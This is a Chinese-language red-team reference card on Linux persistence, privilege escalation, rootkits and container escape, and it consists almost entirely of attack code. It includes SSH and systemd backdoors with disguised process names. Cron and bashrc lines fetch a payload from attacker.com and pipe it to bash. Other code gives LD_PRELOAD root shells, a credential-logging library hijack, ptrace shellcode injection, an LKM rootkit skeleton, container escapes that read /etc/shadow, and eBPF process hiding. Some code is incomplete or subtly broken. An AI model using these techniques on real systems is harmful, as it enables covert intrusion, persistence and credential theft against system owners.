---
id: 27-004
title: "Linux攻击与权限维持技术 (Linux Attack & Persistence)"
category: 操作系统安全
category_en: "OS Security"
difficulty: ★★★★
tools: "LinPEAS, GTFO Bins, systemctl, kernel-exploit, Rootkit, Chisel, Ligolo"
last_updated: 2026-05
tags: ["os-security", "windows-hardening", "linux-hardening", "macos", "privilege-escalation"]
subdomain: os-security
nist_csf: ["PR.AC-01", "PR.DS-07", "PR.PT-01"]
mitre_attack: ["T1548", "T1552", "T1562"]
---
# Linux攻击与权限维持技术 (Linux Attack & Persistence)

## 概述

Linux 系统的攻击技术涵盖本地权限维持、凭据窃取、持久化后门、rootkit 安装、容器逃逸等多个维度。本技能深入覆盖超出基础提权枚举（模块04已覆盖）的进阶 Linux 攻击手法，包括 capabilities 滥用、LD_PRELOAD 劫持、动态链接库注入、systemd-managed 持久化、LKM rootkit、eBPF 逃逸检测等，为渗透测试和红队评估提供系统化的技术参考。

## 核心技能

### 1. Linux 权限维持与后门技术

```bash
# SSH 后门与密钥持久化
# 添加 SSH 公钥到目标用户
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2E..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# SSH 配置后门（允许特定用户绕过限制）
cat >> /etc/ssh/sshd_config << 'EOF'
Match User backdoor
  PermitRootLogin yes
  PasswordAuthentication yes
  AuthenticationMethods password
EOF

# 伪造 SSH 日志采集（密码嗅探）
cat > /usr/lib/systemd/system/ssh-logger.service << 'EOF'
[Unit]
Description=SSH Logger
After=network.target

[Service]
ExecStart=/usr/bin/ssh-honeypot
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# systemd 持久化服务
cat > /etc/systemd/system/system-update.service << 'EOF'
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/.system-update
Restart=on-failure
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF
systemctl enable system-update.service
systemctl start system-update.service

# 伪装系统进程名
cat > /usr/local/bin/.system-update << 'EOF'
#!/bin/bash
while true; do
  # 重命名进程为系统服务名
  exec -a [kworker/0:0] /path/to/c2/payload
  sleep 300
done
EOF
chmod +x /usr/local/bin/.system-update

# Cron 持久化（多种触发方式）
# 每 5 分钟回连
(crontab -l 2>/dev/null; echo "*/5 * * * * /usr/bin/curl -s --connect-timeout 10 https://attacker.com/payload | bash") | crontab -

# 系统定时任务后门
echo "* * * * * root /usr/bin/python3 /usr/lib/python3/.cache.py" > /etc/cron.d/.system-cache

# 利用 bashrc/profile 持久化
echo 'source ~/.bashrc.backup' >> ~/.bashrc
echo 'alias ssh="nohup bash -c '\''curl -s attacker.com/pyld | bash &'\'' >/dev/null 2>&1; /usr/bin/ssh'" >> ~/.bashrc

# 隐藏进程（修改 argv[0]）
python3 -c "
import sys, os, time
if __name__ == '__main__':
    sys.argv[0] = '[kworker/u:2]'
    os.execl('/bin/bash', '[kworker/u:2]', '-c', '/path/to/backdoor.sh')
"
```

### 2. Linux 特权和 capabilities 滥用

```bash
# 枚举可滥用的 capabilities
getcap -r / 2>/dev/null

# cap_setuid+ep — 允许任意设置 UID
# 寻找有 cap_setuid 的二进制文件
getcap /usr/bin/python3.9
# /usr/bin/python3.9 = cap_setuid+ep

# 利用 python cap_setuid 提权
/usr/bin/python3.9 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# cap_dac_override — 绕过文件权限检查
# 利用有 cap_dac_override 的 tar 读取 /etc/shadow
tar -cvf /dev/null /etc/shadow --to-command=cat

# cap_sys_admin — 相当于部分 root 能力
# 利用有 cap_sys_admin 的二进制进行命名空间操作
unshare -Urm /bin/bash   # 用户命名空间逃逸

# 查找 SUID/SGID 二进制（基本提权）
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Writable SUID 检测
find / -type f -perm -4000 -o -type f -perm -2000 2>/dev/null | while read f; do
  if [ -O "$f" ]; then echo "Writable SUID: $f"; fi
done
```

```bash
# 共享库劫持
# 1. LD_PRELOAD 提权
# 编译恶意共享库
cat > evil.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/evil.so evil.c

# 当目标执行SUID二进制并环境变量不受限时
sudo LD_PRELOAD=/tmp/evil.so /usr/sbin/sshd  # 替换任何SUID程序

# 2. LD_LIBRARY_PATH 劫持
# 查找SUID二进制使用的共享库
ldd /usr/sbin/sshd

# 创建劫持库
cat > libutil.so.c << 'EOF'
#include <string.h>
#include <dlfcn.h>
typedef int (*orig_login_fn)(const char*);

int login(const char* user) {
    // 记录登录凭证
    char buf[1024];
    snprintf(buf, sizeof(buf), "[LOG] user: %s\n", user);
    // 写入后门文件
    int fd = open("/var/log/.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
    write(fd, buf, strlen(buf));
    close(fd);
    // 调用原始函数
    orig_login_fn orig = (orig_login_fn)dlsym(RTLD_NEXT, "login");
    return orig(user);
}
EOF
gcc -shared -fPIC -o libutil.so libutil.so.c -ldl

# 3. RPATH 劫持（无需修改环境变量）
# 检查二进制文件的 RPATH
readelf -d /usr/bin/some-binary | grep RPATH
# 如果包含可写路径，将恶意库放入该目录
```

### 3. 进程注入与内核级隐匿

```bash
# Ptrace 进程注入（利用 ptrace 系统调用）
cat > inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    pid_t target;
    struct user_regs_struct old_regs, regs;
    unsigned char shellcode[] = "\x48\x31\xc0\x48\x31\xff\x48\x31\xf6...";  // execve /bin/sh
    
    if (argc < 2) { printf("Usage: %s <pid>\n", argv[0]); return 1; }
    target = atoi(argv[1]);
    
    ptrace(PTRACE_ATTACH, target, NULL, NULL);
    waitpid(target, NULL, 0);
    ptrace(PTRACE_GETREGS, target, NULL, &regs);
    
    // 备份寄存器
    memcpy(&old_regs, &regs, sizeof(struct user_regs_struct));
    
    // 注入 shellcode 到 RIP 位置
    ptrace(PTRACE_POKETEXT, target, (void*)regs.rip, (void*)shellcode);
    
    // 恢复执行
    ptrace(PTRACE_SETREGS, target, NULL, &regs);
    ptrace(PTRACE_DETACH, target, NULL, NULL);
    return 0;
}
EOF
gcc -o inject inject.c

# memfd 无文件执行
python3 -c "
import ctypes, os
# 从内存加载 ELF 执行（不落地磁盘）
fd = os.memfd_create('', flags=0)
with open('/path/to/payload', 'rb') as f:
    os.write(fd, f.read())
os.fchmod(fd, 0o755)
os.execve(f'/proc/self/fd/{fd}', [], os.environ)
"
```

```bash
# LKM rootkit 技术（内核模块隐藏）
# 简易 LKM rootkit 示例
cat > rootkit.c << 'EOF'
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/hide.h>  // hide 函数

static int __init rootkit_init(void) {
    printk(KERN_DEBUG "Rootkit loaded\n");
    // 隐藏内核模块自身
    hide_module();
    // 挂钩系统调用表
    hook_syscalls();
    return 0;
}

static void __exit rootkit_exit(void) {
    unhook_syscalls();
}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");
EOF
make -C /lib/modules/$(uname -r)/build M=$(pwd) modules

# 加载 rootkit
insmod rootkit.ko

# LKM 逃逸技术：修改系统调用表
# 挂钩 sys_kill — 信号后门
# 向特定 PID 发特定信号触发 root shell
# kill -41 <any_pid>  # 触发 root shell

# 隐藏进程
# 挂钩 sys_getdents64 过滤 /proc 条目
# 挂钩 sys_open 隐藏文件
```

### 4. 容器逃逸与命名空间突破

```bash
# 检查是否在容器中
cat /proc/1/cgroup | grep -i docker
cat /proc/1/cgroup | grep -i kubepods
cat /proc/1/sched | head -n 1
# 检测 .dockerenv 文件
ls -la /.dockerenv 2>/dev/null

# 容器逃避绕过（SYS_ADMIN Capability）
# 如果容器有 --privileged 或 --cap-add=SYS_ADMIN

# 1. 挂载宿主机文件系统
fdisk -l
# 创建挂载点并挂载宿主机磁盘
mkdir /mnt/escape
mount /dev/sda1 /mnt/escape
chroot /mnt/escape /bin/bash

# 2. cgroup 逃逸（release_agent 利用）
# 适用于 Docker 默认配置（privileged 容器）
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/bash' > /cmd
echo "cat /etc/shadow > $host_path/shadow" >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# 3. Docker Socket 逃逸
# 如果容器挂载了 /var/run/docker.sock
docker run -it -v /:/mnt ubuntu chroot /mnt /bin/bash

# 4. nsenter 逃逸（有 CAP_SYS_ADMIN）
# 查看宿主机命名空间
ls -la /proc/1/ns/
# 进入宿主机命名空间
nsenter --target 1 --mount --uts --ipc --pid -- /bin/bash

# 5. /proc 逃逸
# 宿主机的 /proc 对容器可见时
cat /proc/1/environ | tr '\0' '\n'
cat /proc/1/cmdline
# 读取宿主机根文件系统
ls -la /proc/1/root/
```

```bash
# 使用 Linux 命名空间创建隔离攻击基础设施
# 创建新的网络命名空间绕过防火墙
ip netns add attacker-ns
ip link add veth0 type veth peer name veth1
ip link set veth1 netns attacker-ns
ip addr add 10.0.0.1/24 dev veth0
ip link set veth0 up
ip netns exec attacker-ns ip addr add 10.0.0.2/24 dev veth1
ip netns exec attacker-ns ip link set veth1 up
# 在隔离命名空间中运行 C2 通信
ip netns exec attacker-ns bash
```

### 5. eBPF 与追踪逃逸

```bash
# eBPF 程序用于进程隐藏
# 安装 bcc 工具
apt-get install bpfcc-tools linux-headers-$(uname -r)

# 使用 eBPF 挂钩 execve 系统调用
# （需要 root 或 CAP_BPF+CAP_PERFMON）
cat > execve-hide.c << 'EOF'
#include <uapi/linux/ptrace.h>
#include <linux/sched.h>

int kprobe__sys_execve(struct pt_regs *ctx) {
    char comm[TASK_COMM_LEN];
    bpf_get_current_comm(&comm, sizeof(comm));
    
    // 隐藏特定进程名
    if (comm[0] == '[' && comm[1] == 'h')  // 匹配 [hidden]
        bpf_override_return(ctx, -EACCES);  // 内核 5.x 支持
    return 0;
}
EOF

# bpftrace 动态追踪
bpftrace -e 'kprobe:sys_openat { if(strstr(str(arg1),"shadow")!=0){printf("%s called openat on %s\n",comm,str(arg1));} }'

# 检测 eBPF 挂钩
# 对攻击者：在 /sys/kernel/debug/tracing/ 中抹去痕迹
# 对防御者：检测 kprobe/kretprobe 挂钩点
cat /sys/kernel/debug/kprobes/list
ls /sys/kernel/debug/tracing/events/
```

## 常用工具

| 工具 | 用途 | 链接 |
|:---|:---|:---|
| LinPEAS | Linux 提权枚举工具 | https://github.com/carlospolop/PEASS-ng |
| GTFO Bins | Unix 二进制滥用查询 | https://gtfobins.github.io/ |
| Chisel | 隧道代理工具 | https://github.com/jpillora/chisel |
| Diamorphine | LKM rootkit | https://github.com/m0nad/Diamorphine |
| bcc/bpftrace | eBPF 动态追踪工具 | https://github.com/iovisor/bcc |
| CDK | 容器逃逸工具集 | https://github.com/cdk-team/CDK |
| LiME | Linux 内存取证 | https://github.com/504ensicsLabs/LiME |

## 参考资源

- [MITRE ATT&CK — T1543 Create or Modify System Process](https://attack.mitre.org/techniques/T1543/)
- [MITRE ATT&CK — T1546 Event Triggered Execution](https://attack.mitre.org/techniques/T1546/)
- [MITRE ATT&CK — T1070 Indicator Removal](https://attack.mitre.org/techniques/T1070/)
- [GTFOBins — Unix Privilege Escalation](https://gtfobins.github.io/)
- [HackTricks — Linux Persistence](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-persistence)
- [Linux Container Escape — CDK](https://github.com/cdk-team/CDK/wiki)
- [eBPF 安全研究 — ebpf.io](https://ebpf.io/)
- [LKM Rootkit 编写指南 — Linux Journal](https://www.linuxjournal.com/article/7005)
